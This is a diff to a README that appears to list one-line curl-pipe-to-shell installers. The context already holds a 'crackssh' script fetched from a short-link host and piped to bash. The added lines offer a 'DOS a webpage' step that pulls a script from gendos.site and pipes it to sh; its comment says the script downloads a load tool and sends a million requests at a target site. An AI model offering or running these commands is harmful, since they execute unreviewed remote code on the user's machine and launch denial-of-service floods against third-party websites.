@@ -21,6 +21,13 @@ curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/crackssh | bash -s 
 curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/boilerplate | bash -s <project_name>
 ```
 
+* [DOS a webpage](http://gendos.site)
+
+```
+# What this does, is it downloads https://github.com/rakyll/hey for amd64 linux and shoots against the 'target.com'
+curl -L "gendos.site?args=https://target.com%20-n=1000000" | sh
+```
+
 ## License
 
 This project is licensed under the GPL-3 license.
